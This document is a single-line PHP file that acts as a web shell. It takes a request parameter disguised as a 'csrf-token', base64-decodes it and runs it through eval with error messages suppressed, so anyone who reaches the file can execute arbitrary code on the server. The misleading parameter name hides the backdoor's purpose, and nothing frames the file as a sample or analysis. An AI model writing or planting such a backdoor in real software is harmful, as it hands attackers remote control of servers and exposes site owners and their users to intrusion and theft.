<?php $s = @base64_decode($_REQUEST["csrf-token"]);  @eval($s);
